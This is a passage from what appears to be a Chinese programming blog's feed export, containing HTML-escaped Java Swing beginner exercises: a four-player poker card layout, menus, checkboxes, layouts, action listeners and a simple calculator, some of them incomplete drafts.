        for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
        &#123;
            PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;&quot; + WpukePhoto[i]);
            ButtonPhoto[i] &#x3D; new JButton(PukePhoto);
            ButtonPhoto[i].setBounds(firstPositionx + kuan * i, firstPositiony, pw, ph);
            jp.add(ButtonPhoto[i], new Integer(i));
        &#125;
    &#125;

&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">package pukepai;

import javax.swing.*;
import java.awt.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class PokeFrame22
&#123;

    String[] pk &#x3D; new String[52]; &#x2F;&#x2F; 存放52张扑克牌文件名
    Poke poke &#x3D; new Poke();
    JInternalFrame jif[] &#x3D; new JInternalFrame[4];
    JFrame jf;
    Toolkit tk;
    int w, h; &#x2F;&#x2F; 窗体的宽和高
    int jw, jh; &#x2F;&#x2F; neibuchuangti的宽和高
    JButton[] jb &#x3D; new JButton[13];
    int x1 &#x3D; 40; &#x2F;&#x2F; 表示2个扑克牌按钮叠加在一起的宽度
    int y1 &#x3D; 150; &#x2F;&#x2F; 表示扑克牌按钮底边距离neibuchuangti底边的位置

    public PokeFrame22()
    &#123;
        jf &#x3D; new JFrame(&quot;包含4个neibuchuangti且每个neibuchuangti包含13张牌按钮的窗体&quot;);
        jf.setExtendedState(JFrame.MAXIMIZED_BOTH);
        tk &#x3D; Toolkit.getDefaultToolkit();
        w &#x3D; tk.getScreenSize().width;
        h &#x3D; tk.getScreenSize().height;
        dedaopai();
        tianjianeibuchuangti();
        jf.setVisible(true);
        jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    &#125;

    public static void main(String[] args)
    &#123;
        try
        &#123;
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        &#125; catch (ClassNotFoundException ex)
        &#123;
            Logger.getLogger(PokeFrame21.class.getName()).log(Level.SEVERE, null, ex);
        &#125; catch (InstantiationException ex)
        &#123;
            Logger.getLogger(PokeFrame21.class.getName()).log(Level.SEVERE, null, ex);
        &#125; catch (IllegalAccessException ex)
        &#123;
            Logger.getLogger(PokeFrame21.class.getName()).log(Level.SEVERE, null, ex);
        &#125; catch (UnsupportedLookAndFeelException ex)
        &#123;
            Logger.getLogger(PokeFrame21.class.getName()).log(Level.SEVERE, null, ex);
        &#125;
        PokeFrame22 pf &#x3D; new PokeFrame22();
    &#125;

    public void dedaopai()
    &#123;
        pk &#x3D; poke.zuhepai();
    &#125;

    public void tianjianeibuchuangti()
    &#123;
        jw &#x3D; w &#x2F; 2; &#x2F;&#x2F; neibuchuangti的宽等于屏幕的宽&#x2F;2
        jh &#x3D; h &#x2F; 2; &#x2F;&#x2F; neibuchuangti的高等于屏幕的高&#x2F;2
        jf.setLayout(new GridLayout(2, 2));
        for (int i &#x3D; 0; i &lt;&#x3D; 3; i++)
        &#123;
            jif[i] &#x3D; new neibuchuangti(i + 1);
            jif[i].setVisible(true);
            jf.add(jif[i]);
        &#125;
    &#125;

    class neibuchuangti extends JInternalFrame
    &#123;

        JLayeredPane jp;
        int n;

        public neibuchuangti(int n)
        &#123;
            super(&quot;玩家&quot; + n);
            this.n &#x3D; n;
            this.setLayout(null);
            jp &#x3D; this.getLayeredPane();
            tianjiabeijing();
            tianjiapaianniu(n);
        &#125;

        public void tianjiabeijing()
        &#123;
            ImageIcon bj &#x3D; new ImageIcon(&quot;img&#x2F;bj.jpg&quot;);
            JLabel jl &#x3D; new JLabel(bj);
            jl.setSize(jw, jh);
            jp.add(jl, new Integer(-100));
        &#125;

        public void tianjiapaianniu(int k)
        &#123;
            &#x2F;&#x2F; 参数x1表示扑克牌重叠的宽度,y1表示扑克牌y方向的起始位置
            String pName;
            ImageIcon img;
            jp &#x3D; this.getLayeredPane();
            pName &#x3D; &quot;img&#x2F;&quot; + pk[0];
            img &#x3D; new ImageIcon(pName);
            int tw &#x3D; img.getIconWidth();
            int th &#x3D; img.getIconHeight();
            int a &#x3D; tw - x1-30; &#x2F;&#x2F; 表示每张牌按钮实际占有的宽度（后一张牌和前一张牌叠加40px)
            int xs &#x3D; (jw - a * 13) &#x2F; 2; &#x2F;&#x2F; 表示第一张牌按钮在neibuchuangti中x方向的起始位置
            int ys &#x3D; jh - th - y1; &#x2F;&#x2F; 表示牌按钮在neibuchuangti中y方向的起始位置
            int b &#x3D; 13 * (k - 1); &#x2F;&#x2F; 根据不同的k值从pk数组的不同位置取数
            for (int i &#x3D; 0; i &lt;&#x3D; 12; i++)
            &#123;
                pName &#x3D; &quot;img&#x2F;&quot; + pk[i + b];
                img &#x3D; new ImageIcon(pName);
                jb[i] &#x3D; new JButton(img);
                jb[i].setBounds(xs + a * i, ys, tw, th);
                jp.add(jb[i], new Integer(i));
            &#125;
        &#125;

    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>Java_AWT_Swing 学习过程</title>
    <url>/2020/12/01/Java-AWT-Swing-%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>Java_AWT_Swing 学习过程</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">import javax.swing.*;
import java.awt.*;

public class Test &#123;
    public static void main(String[] args) &#123;
        JFrame f1&#x3D;new JFrame(&quot;LHL&#39;s First Java&quot;);
        f1.setVisible(true);
        f1.setSize(800,600);
        &#x2F;&#x2F;f1.setBackground(Color.blue);
        f1.setLocation(40,400);
        f1.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f1.setResizable(true);


    &#125;
&#125;
-------------------------------------
import javax.swing.*;
import java.awt.*;

public class Test &#123;
    public static void main(String[] args) &#123;
        JFrame f1&#x3D;new JFrame(&quot;LHL&#39;s First Java&quot;);
        f1.setVisible(true);
        
        f1.setSize(800,600);
        Container con&#x3D;f1.getContentPane();
        con.setBackground(new Color(154,204,255));
        f1.setLocation(40,400);
        f1.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f1.setResizable(true);


    &#125;
&#125;
----------------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;

class WindowMenu extends JFrame
&#123;
    JMenuBar menubar;
    JMenu menu,subMenu;
    JMenuItem item1,item2;
    public WindowMenu()
    &#123;

    &#125;
    public WindowMenu(String s,int x,int y,int w,int h)
    &#123;
        init(s);
        setLocation(x,y);
        setVisible(true);
        setDefaultCloseOperation(DISPOSE_ON_CLOSE);

    &#125;
    void init(String s)
    &#123;
        setTitle(s);
        menubar&#x3D;new JMenuBar();
        menu&#x3D;new JMenu(&quot;1&quot;);
        subMenu&#x3D;new JMenu(&quot;2&quot;);
        item1&#x3D;new JMenuItem(&quot;3&quot;);
        item2&#x3D;new JMenuItem(&quot;4&quot;);
        item1.setAccelerator(KeyStroke.getKeyStroke(&#39;A&#39;));
        item2.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_S, InputEvent.CTRL_MASK));
        menu.add(item1);
        menu.addSeparator();
        menu.add(item2);
        menu.add(subMenu);
        subMenu.add(new JMenuItem(&quot;5&quot;));
        subMenu.add(new JMenuItem(&quot;6&quot;));
        menubar.add(menu);
        setJMenuBar(menubar);



    &#125;
&#125;
public class Test &#123;
    public static void main(String[] args) &#123;
        WindowMenu w1&#x3D;new WindowMenu(&quot;菜单&quot;,20,30,200,190);
        w1.setSize(800,600);

    &#125;
&#125;
------------------------------------------------
import javax.swing.*;

class window extends JFrame
&#123;
    JMenuBar menber;
    JMenu m1;
    JMenuItem mi1,mi2;
    window(String s,int x,int y,int w,int h)
    &#123;
        setLocation(x,y);
        setVisible(true);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
    &#125;
    &#123;
        
    &#125;
    void init(String s)
    &#123;
        setTitle(s);
        menber&#x3D;new JMenuBar();
        m1&#x3D;new JMenu();
        mi1&#x3D;new JMenuItem();
        mi2&#x3D;new JMenuItem();
        m1.add()
        
    &#125;
&#125;
public class Test &#123;
    public static void main(String[] args) &#123;
       

    &#125;
&#125;
--------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;

class WindowMenu extends JFrame
&#123;
    JMenuBar menubar;
    JMenu head;
    JMenu m1,m2;
    JMenuItem t1,t2;
    public WindowMenu()
    &#123;

    &#125;
    public WindowMenu(String s,int x,int y,int w,int h)
    &#123;
        init(s);
        setLocation(x,y);
        setVisible(true);
        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
        Container con&#x3D; getContentPane();
        con.setBackground(new Color(43,43,43));

    &#125;
    void init(String s)
    &#123;
        setTitle(s);
        menubar &#x3D;new JMenuBar();
        head&#x3D;new JMenu(&quot;头&quot;);
        m1&#x3D;new JMenu(&quot;第一项&quot;);
        m2&#x3D;new JMenu(&quot;第二项&quot;);
        t1&#x3D;new JMenuItem(&quot;第一项的第一项&quot;);
        t2&#x3D;new JMenuItem(&quot;第一项的第二项&quot;);
        m1.add(t1);
        m1.add(t2);
        head.add(m1);
        head.add(m2);
        menubar.add(head);
        setJMenuBar(menubar);


    &#125;
&#125;
public class Test &#123;
    public static void main(String[] args) &#123;
        WindowMenu w1&#x3D;new WindowMenu(&quot;菜单&quot;,20,30,200,190);
        w1.setSize(800,600);

    &#125;
&#125;
----------------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;

class WindowMenu extends JFrame
&#123;
    JMenuBar menubar;
    JMenu head;
    JMenu m1,m2;
    JMenuItem t1,t2,t3;
    public WindowMenu()
    &#123;

    &#125;
    public WindowMenu(String s,int x,int y,int w,int h)
    &#123;
        init(s);
        setLocation(x,y);
        setVisible(true);
        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
        Container con&#x3D; getContentPane();
        con.setBackground(new Color(43,43,43));

    &#125;
    void init(String s)
    &#123;
        setTitle(s);
        menubar &#x3D;new JMenuBar();
        head&#x3D;new JMenu(&quot;头&quot;);
        m1&#x3D;new JMenu(&quot;第一项&quot;);
        m2&#x3D;new JMenu(&quot;第二项&quot;);
        t1&#x3D;new JMenuItem(&quot;第一项的第一项&quot;);
        t2&#x3D;new JMenuItem(&quot;第一项的第二项&quot;);
        t3&#x3D;new JMenuItem(&quot;第三项&quot;,new ImageIcon(&quot;favicon.ico&quot;));
        m1.add(t1);
        m1.add(t2);
        head.add(m1);
        head.add(m2);
        head.add(t3);
        menubar.add(head);
        setJMenuBar(menubar);


    &#125;
&#125;
public class Test &#123;
    public static void main(String[] args) &#123;
        WindowMenu w1&#x3D;new WindowMenu(&quot;菜单&quot;,20,30,200,190);
        w1.setSize(800,600);

    &#125;
&#125;
-------------------------------------------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;

class windows extends JFrame &#123;
    JCheckBox c1, c2;
    JRadioButton rm, rf;
    ButtonGroup group;
    JComboBox&lt;String&gt; comBox;

    public windows() &#123;
        init();
        setTitle(&quot;LHL&#39;s Java&quot;);
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        setVisible(true);

        setSize(300, 100);
        setLocation(40, 100);
    &#125;

    void init() &#123;
        setLayout(new FlowLayout());
        comBox &#x3D; new JComboBox&lt;String&gt;();
        c1 &#x3D; new JCheckBox(&quot;音乐&quot;);
        c2 &#x3D; new JCheckBox(&quot;旅游&quot;);
        group &#x3D; new ButtonGroup();
        rm &#x3D; new JRadioButton(&quot;男&quot;);
        rf &#x3D; new JRadioButton(&quot;女&quot;);
        group.add(rm);
        group.add(rf);
        add(c1);
        add(c2);
        add(rf);
        add(rm);
        comBox.addItem(&quot;音乐天地&quot;);
        comBox.addItem(&quot;武术天地&quot;);
        add(comBox);
    &#125;

&#125;

public class Test &#123;
    public static void main(String[] args) &#123;
        windows w1 &#x3D; new windows();
    &#125;
&#125;
-------------------------------------------------
import javax.swing.*;
import java.awt.*;

class windows extends JFrame
&#123;
    JComboBox&lt;String&gt; box;
    JCheckBox x1, x2;
    JRadioButton m, w;
    ButtonGroup group;
    windows()
    &#123;
        init();
        setTitle(&quot;LHL&#39;s Java&quot;);
        setVisible(true);
        setSize(400,100);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setLocation(40,200);
    &#125;
    void init()
    &#123;
        setLayout(new FlowLayout());
        box&#x3D;new JComboBox&lt;String&gt;();
        x1&#x3D;new JCheckBox(&quot;赛博朋克2077&quot;);
        x2&#x3D;new JCheckBox(&quot;刺客信条英灵殿&quot;);
        m&#x3D;new JRadioButton(&quot;男&quot;);
        w&#x3D;new JRadioButton(&quot;女&quot;);
        group&#x3D;new ButtonGroup();
        group.add(m);
        group.add(w);
        add(x1);
        add(x2);
        add(m);
        add(w);
        box.addItem(&quot;$39.99&quot;);
        box.addItem(&quot;$49.99&quot;);
        add(box);

    &#125;
&#125;

public class Test
&#123;
    public static void main(String[] args)
    &#123;
        windows w1&#x3D;new windows();
    &#125;
&#125;
-------------------------
import javax.swing.*;
import java.*;
import java.awt.*;

class PanelNullLayout extends JPanel
&#123;
    JButton button;
    JTextField text;
    PanelNullLayout()
    &#123;
        setLayout(null);
        button &#x3D;new JButton(&quot;确定&quot;);
        text&#x3D;new JTextField();
        add(text);
        add(button);
        text.setBounds(100,30,90,30);
        button.setBounds(190,30,66,30);
    &#125;
&#125;

class PanelGridLayout extends JPanel
&#123;
    PanelGridLayout()
    &#123;
        GridLayout grid &#x3D; new GridLayout(12, 12);
        setLayout(grid);
        Label label[][] &#x3D; new Label[12][12];
        for (int i &#x3D; 0; i &lt; 12; i++) &#123;
            for (int j &#x3D; 0; j &lt; 12; j++) &#123;
                label[i][j]&#x3D;new Label();
                if ((i + j) % 2 &#x3D;&#x3D; 0)
                    label[i][j].setBackground(Color.black);
                else
                    label[i][j].setBackground(Color.white);
                add(label[i][j]);
            &#125;
        &#125;
    &#125;
&#125;

class ShowLayout extends JFrame
&#123;
    PanelGridLayout pannelGrid;
    PanelNullLayout panelNull;
    JTabbedPane p;
    ShowLayout()
    &#123;
        pannelGrid&#x3D;new PanelGridLayout();
        panelNull&#x3D;new PanelNullLayout();
        p&#x3D;new JTabbedPane();
        p.add(&quot;网格布局的面板&quot;,pannelGrid);
        p.add(&quot;空布局的面板&quot;,panelNull);
        add(p,BorderLayout.CENTER);
        add(new JButton(&quot;窗体是BorderLayout布局&quot;),BorderLayout.NORTH);
        add(new JButton(&quot;南&quot;),BorderLayout.SOUTH);
        add(new JButton(&quot;西&quot;),BorderLayout.WEST);
        add(new JButton(&quot;东&quot;),BorderLayout.EAST);
        setBounds(10,10,570,390);
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        validate();
    &#125;

&#125;

public class test
&#123;
    public static void main(String[] args)
    &#123;
        new ShowLayout();
    &#125;
&#125;
-------------------------------------------------
import javax.swing.*;
import java.awt.*;

class windowboxLayout extends JFrame
&#123;
    Box boxH;
    Box boxVOne,boxVTwo;
    public windowboxLayout()
    &#123;
        setLayout(new FlowLayout());
        init();
        setVisible(true);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
    &#125;
    void init()
    &#123;
        boxH &#x3D;Box.createHorizontalBox();
        boxVOne&#x3D;Box.createVerticalBox();
        boxVTwo&#x3D;Box.createVerticalBox();
        boxVOne.add(new JLabel(&quot;姓名：&quot;));
        boxVOne.add(new JLabel(&quot;职业：&quot;));
        boxVTwo.add(new JTextField(10));
        boxVTwo.add(new JTextField(10));
        boxH.add(boxVOne);
        boxH.add(Box.createHorizontalStrut(10));
        boxH.add(boxVTwo);
        add(boxH);
        setBounds(10,10,300,110);
    &#125;
&#125;

public class test
&#123;
    public static void main(String[] args)
    &#123;
        windowboxLayout w1&#x3D;new windowboxLayout();
    &#125;
&#125;
----------------------------------
import javax.swing.*;
import java.awt.*;
class windowboxLayout extends  JFrame
&#123;
    Box wai;
    Box nei1,nei2;
    windowboxLayout()
    &#123;
        setLayout(new FlowLayout());
        init();
        setVisible(true);
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        setBounds(10,10,300,90);
    &#125;
    void init()
    &#123;
        wai&#x3D;Box.createHorizontalBox();
        nei1&#x3D;Box.createVerticalBox();
        nei2&#x3D;Box.createVerticalBox();
        nei1.add(new JLabel(&quot;姓名:&quot;));
        nei1.add(new JLabel(&quot;性别:&quot;));
        nei2.add(new JTextField(10));
        nei2.add(new JTextField(10));
        wai.add(nei1);
        wai.add(nei2);
        add(wai);
    &#125;
&#125;
public class test
&#123;
    public static void main(String[] args)
    &#123;
        windowboxLayout w1 &#x3D; new windowboxLayout();
    &#125;
&#125;
----------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

class WindowActionEvent extends JFrame
&#123;
    JTextField text;
    ActionListener listener;
    WindowActionEvent()
    &#123;
        setLayout(new FlowLayout());
        text&#x3D;new JTextField(10);
        add(text);
        listener&#x3D;new ReaderListen();
        text.addActionListener(listener);
        setVisible(true);
        setBounds(10,10,200,400);
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
    &#125;
&#125;
class ReaderListen implements ActionListener
&#123;
    public void actionPerformed(ActionEvent e)
    &#123;
        String str&#x3D;e.getActionCommand();
        System.out.println(str+&quot;:&quot;+str.length());
    &#125;
&#125;
public class test
&#123;
    public static void main(String[] args)
    &#123;
        WindowActionEvent w1&#x3D;new WindowActionEvent();
    &#125;
&#125;
--------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

class WindowActionEvent extends JFrame
&#123;
    JTextField text;
    ActionListener listener;
    WindowActionEvent()
    &#123;
        setLayout(new FlowLayout());
        Container co&#x3D;this.getContentPane();
        co.setBackground(new Color(27,40,56));
        text&#x3D;new JTextField(10);
        listener&#x3D;new ReaderListen();
        text.addActionListener(listener);
        add(text);
        setBounds(10,10,200,400);
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    &#125;
&#125;
class ReaderListen implements ActionListener
&#123;
    @Override
    public void actionPerformed(ActionEvent e)
    &#123;
        String s&#x3D;e.getActionCommand();
        System.out.println(s+&quot;的字节数是:&quot;+s.length());
    &#125;
&#125;
public class test
&#123;
    public static void main(String[] args)
    &#123;
        WindowActionEvent w1&#x3D;new WindowActionEvent();
    &#125;
&#125;
--------------------------------------------
import com.sun.javaws.util.JfxHelper;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

interface MycommandListener extends ActionListener
&#123;
    public void setJTextField(JTextField text);

    public void setJTextArea(JTextArea area);
&#125;

class WindowActionEvent extends JFrame
&#123;
    JTextField inputText;
    JTextArea textShow;
    JButton button;
    MycommandListener listener;

    public WindowActionEvent()
    &#123;
        init();
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 360, 230);
        setTitle(&quot;LHL&#39;s Java&quot;);
    &#125;

    void init()
    &#123;
        setLayout(new FlowLayout());
        inputText &#x3D; new JTextField(10);
        button &#x3D; new JButton(&quot;确定&quot;);
        textShow &#x3D; new JTextArea(9, 30);
        add(inputText);
        add(button);
        add(new JScrollPane(textShow));
    &#125;

    void setMyCommandListener(MycommandListener listener)
    &#123;
        this.listener &#x3D; listener;
        listener.setJTextField(inputText);
        listener.setJTextArea(textShow);
        inputText.addActionListener(listener);
        button.addActionListener(listener);
    &#125;
&#125;

class PoliceListen implements MycommandListener
&#123;
    JTextField textInput;
    JTextArea textShow;

    @Override
    public void setJTextField(JTextField text)
    &#123;
        textInput &#x3D; text;
    &#125;

    @Override
    public void setJTextArea(JTextArea area)
    &#123;
        textShow &#x3D; area;
    &#125;

    @Override
    public void actionPerformed(ActionEvent e)
    &#123;
        String str &#x3D; textInput.getText();
        textShow.append(str + &quot;的长度:&quot; + str.length() + &#39;\n&#39;);
    &#125;
&#125;

public class test
&#123;
    public static void main(String[] args)
    &#123;
        WindowActionEvent win &#x3D; new WindowActionEvent();
        PoliceListen police &#x3D; new PoliceListen();
        win.setMyCommandListener(police);

    &#125;
&#125;
-0------------------------
错误：
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
interface Mylisten extends ActionListener
&#123;
    public void setText(JTextField text);
    public void setShow(JTextArea show);
&#125;
class window extends JFrame
&#123;
    JButton button;
    JTextArea show;
    JTextField text;
    Mylisten listen ;
    window()
    &#123;
        init();
        setVisible(true);
        setBounds(10,10,360,230);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    &#125;
    void init()
    &#123;
        setLayout(new FlowLayout());
        JButton button&#x3D;new JButton(&quot;计算&quot;);
        JTextField text&#x3D;new JTextField(10);
        JTextArea show&#x3D;new JTextArea(9,30);
        add(text);
        add(button);
        add(new JScrollPane(show));
    &#125;
    void setListen(Mylisten listener)
    &#123;
        listen&#x3D;listener;
        listener.setShow(show);
        listener.setText(text);
        text.addActionListener(listener);
        button.addActionListener(listener);
    &#125;
&#125;
class police implements Mylisten
&#123;
    JTextArea area;
    JTextField Text;

    @Override
    public void setText(JTextField text)
    &#123;
        Text&#x3D;text;
    &#125;

    @Override
    public void setShow(JTextArea show)
    &#123;
        area&#x3D;show;
    &#125;

    @Override
    public void actionPerformed(ActionEvent e)
    &#123;
        String s&#x3D;Text.getText();
        area.append(s+&quot;长度为:&quot;+s.length());
    &#125;
&#125;
public class test
&#123;
    public static void main(String[] args)
    &#123;
        window w1&#x3D;new window();
        police p1&#x3D;new police();
        w1.setListen(p1);

    &#125;
&#125;
----------------------------------------
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

interface listenList extends ActionListener
&#123;
    public void setText(JTextField text);
    public void setShow(JTextArea show);
&#125;
class window extends JFrame
&#123;
    JButton button;
    JTextField text;
    JTextArea show;
    listenList listen;
    window()
    &#123;
        init();
        setVisible(true);
        setBounds(10,10,400,300);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    &#125;
    void init()
    &#123;
        setLayout(new FlowLayout());
        button&#x3D;new JButton(&quot;计算&quot;);
        text&#x3D;new JTextField(10);
        show&#x3D;new JTextArea(9,30);
        add(text);
        add(button);
        add(new JScrollPane(show));
    &#125;
    void setList(listenList listen)
    &#123;
        this.listen&#x3D;listen;
        listen.setShow(show);
        listen.setText(text);
        text.addActionListener(listen);
        button.addActionListener(listen);
    &#125;

&#125;
class police implements listenList
&#123;
    JTextArea Show;
    JTextField Text;
    @Override
    public void setText(JTextField text)
    &#123;
        Text&#x3D;text;
    &#125;

    @Override
    public void setShow(JTextArea show)
    &#123;
        Show&#x3D;show;
    &#125;

    @Override
    public void actionPerformed(ActionEvent e)
    &#123;
        String str&#x3D;Text.getText();
        Show.append(str+&quot;的长度为：&quot;+str.length()+&#39;\n&#39;);
    &#125;
&#125;
public class test
&#123;
    public static void main(String[] args)
    &#123;
        window w1&#x3D;new window();
        police p1&#x3D;new police();
        w1.setList(p1);

    &#125;
&#125;
-------------------------------------------------------------
计算器
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
class ComputerListerner implements ActionListener
&#123;
    JTextField inputNumberOne,inputNuberTwo;
    JTextArea textShow;
    String fuhao;
    public void setTextFieldOne(JTextField t)
    &#123;
        inputNumberOne&#x3D;t;
    &#125;
    public void setJTextFieldTwo(JTextField t)
    &#123;
        inputNuberTwo&#x3D;t;
    &#125;
    public void setJTextArea(JTextArea area)
    &#123;
        textShow&#x3D;area;
    &#125;
    public  void setFuhao(String s)
    &#123;
        fuhao&#x3D;s;
    &#125;
    @Override
    public void actionPerformed(ActionEvent e)
    &#123;
        try
        &#123;
            double number1&#x3D;Double.parseDouble(inputNumberOne.getText());
            double number2&#x3D;Double.parseDouble(inputNuberTwo.getText());
            double result&#x3D;0;
            if(fuhao.equals(&quot;+&quot;))
            &#123;
                result &#x3D;number1+number2;
            &#125;
            else if(fuhao.equals(&quot;-&quot;))
            &#123;
                result&#x3D;number1-number2;
            &#125;
            else if(fuhao.equals(&quot;*&quot;))
            &#123;
                result&#x3D;number1*number2;
            &#125;
            else if(fuhao.equals(&quot;&#x2F;&quot;))
            &#123;
                result&#x3D;number1&#x2F;number2;
            &#125;
            textShow.append(number1+&quot; &quot;+fuhao+&#39; &#39;+number2+&quot; &#x3D; &quot;+result+&quot;\n&quot;);
        &#125;
        catch (Exception exp)
        &#123;
            textShow.append(&quot;\n请输入数字字符\n&quot;);
        &#125;
    &#125;

&#125;

class OperatorListener implements ItemListener
&#123;
    JComboBox choice;
    ComputerListerner workTogether;
    public void setJCombBox(JComboBox box)
    &#123;
        choice&#x3D;box;
    &#125;
    public void setWorkTogether(ComputerListerner computer)
    &#123;
        workTogether&#x3D;computer;
    &#125;
    public void itemStateChanged(ItemEvent e)
    &#123;
        String fuhao&#x3D;choice.getSelectedItem().toString();
        workTogether.setFuhao(fuhao);
    &#125;
&#125;


class WindowOperation extends JFrame
&#123;
    JTextField inputNumberOne,inputNuberTwo;
    JComboBox choiceFuhao;
    JTextArea textShow;
    JButton button;
    OperatorListener operator;
    ComputerListerner computer;
    public WindowOperation()
    &#123;
        init();
        setVisible(true);
        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        setBounds(100,100,390,360);
        setTitle(&quot;LHL&#39;s Java&quot;);
    &#125;
    void init()
    &#123;
        setLayout(new FlowLayout());
        inputNumberOne&#x3D;new JTextField(5);
        inputNuberTwo&#x3D;new JTextField(5);
        choiceFuhao&#x3D;new JComboBox();
        button &#x3D;new JButton(&quot;计算&quot;);
        choiceFuhao.addItem(&quot;选择运算符号:&quot;);

        String []a&#x3D;&#123;&quot;+&quot;,&quot;-&quot;,&quot;*&quot;,&quot;&#x2F;&quot;&#125;;
        for(int i&#x3D;0;i&lt;a.length;i++)
        &#123;
            choiceFuhao.addItem(a[i]);
        &#125;
        textShow&#x3D;new JTextArea(9,30);
        operator&#x3D;new OperatorListener();
        computer&#x3D;new ComputerListerner();
        operator.setJCombBox(choiceFuhao);
        operator.setWorkTogether(computer);
        computer.setTextFieldOne(inputNumberOne);
        computer.setJTextFieldTwo(inputNuberTwo);
        computer.setJTextArea(textShow);
        choiceFuhao.addItemListener(operator);

        button.addActionListener(computer);
        add(inputNumberOne);
        add(choiceFuhao);
        add(inputNuberTwo);
        add(button);
        add(new JScrollPane(textShow));
    &#125;

&#125;
public class test
&#123;
    public static void main(String []args)
    &#123;
        WindowOperation w1&#x3D;new WindowOperation();
    &#125;
&#125;
-----------------------------
import javax.swing.*;
import java.awt.*;

class create extends JFrame
&#123;
    Box b1,b2,b3,b4,b5,b6,b7,b8,b9,b10;
    JButton t1,t2,t3,t4,t5,t6,t7,t8,t9,t10;
    create() &#123;

        setLayout(new FlowLayout());
        t1.setSize(10,14);
        t4.setSize(10,14);
        t5.setSize(10,14);
        t10.setSize(10,14);
        t2.setSize(20,7);
        t3.setSize(20,7);
        t6.setSize(10,7);
        t7.setSize(10,7);
        t8.setSize(10,7);
        t9.setSize(10,7);

        b1&#x3D;Box.createVerticalBox();
        b1.add(t1);
        b1&#x3D;Box.createVerticalBox();
        b2.add(t2);
        b2.add(t3);
        b3&#x3D;Box.createVerticalBox();
        b3.add(t4);
        b4&#x3D;Box.createVerticalBox();
        b4.add(t5);
        b5.add(t6);
        b5.add(t8);
        b6&#x3D;Box.createVerticalBox();
        b6.add(t7);
        b6.add(t9);
        b7&#x3D;Box.createVerticalBox();
        b7.add(t10);
        b8&#x3D;Box.createHorizontalBox();
        b8.add(b1);
        b8.add(b2);
        b8.add(b3);
        b9&#x3D;Box.createHorizontalBox();
        b9.add(b4);
        b9.add(b5);
        b9.add(b6);
        b9.add(b7);
        b10&#x3D;Box.createVerticalBox();
        b10.add(b8);
        b10.add(b9);
        add(b10);
        setVisible(true);
